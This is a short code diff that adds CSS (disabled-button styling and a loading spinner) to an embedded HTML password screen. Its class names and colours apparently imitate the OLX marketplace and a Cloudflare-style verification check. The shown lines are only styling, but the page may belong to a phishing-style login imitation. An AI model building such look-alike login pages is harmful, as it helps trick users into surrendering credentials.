@@ -142,10 +142,13 @@ const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
   .cf-right span{font-size:9px;color:#999;line-height:1}
   .btn-entrar{display:block;width:100%;padding:18px;border:0;border-radius:9999px;background:#f48120;color:#fff;font:inherit;font-size:18px;font-weight:700;text-align:center;cursor:pointer;transition:opacity .15s}
   .btn-entrar:hover{opacity:.9}
+  .btn-entrar:disabled,.btn-entrar[disabled]{background:#d0d0d0;color:#fff;cursor:not-allowed;opacity:1}
+  .btn-entrar:disabled:hover,.btn-entrar[disabled]:hover{opacity:1}
   .links{display:flex;justify-content:space-between;align-items:center;margin:20px 0 0;padding:0}
   .links a,.links button{background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;padding:0}
   .links a:hover,.links button:hover{text-decoration:underline}
   @keyframes olxSpin{to{transform:rotate(360deg)}}
+  .cf-spinner{width:22px;height:22px;border:3px solid #e5e7eb;border-top-color:#f48120;border-radius:50%;animation:olxSpin .8s linear infinite;flex-shrink:0}
 </style>
 </head>
 <body>
